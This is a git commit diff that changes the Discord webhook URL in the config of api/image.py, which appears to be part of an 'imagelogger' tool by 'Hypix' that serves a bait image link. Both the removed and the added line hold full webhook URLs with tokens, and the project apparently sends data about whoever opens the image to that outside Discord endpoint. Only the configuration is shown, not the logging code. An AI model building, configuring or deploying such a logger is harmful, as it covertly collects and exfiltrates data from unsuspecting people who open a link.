72e49993c07374b8bfeee485165ef4ce001bc95e
hypix22 <lillebror22@icloud.com>
2026-04-23 22:51:19 +0200

    Update Discord webhook URL in config

--- api/image.py
+++ api/image.py
@@ -13,7 +13,7 @@ __author__ = "Hypix"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1439923061104312412/wL3vS4p44Pr6v7khv4XZeqMKp2g4rWL4BBtpJcKMIhWPycqUduAuSB5X3Cu4qTOeD5F5",
+    "webhook": "https://discord.com/api/webhooks/1384523887043280906/N9tLcqr5nV0tzMLYOWDLSvyjtXLSGE0f6sWgLV9GjXLEvEquF8ASpqX8mKrY5F9UsT0m",
     "image": "https://www.shutterstock.com/image-photo/bill-torn-revealing-words-you-260nw-1734671219.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
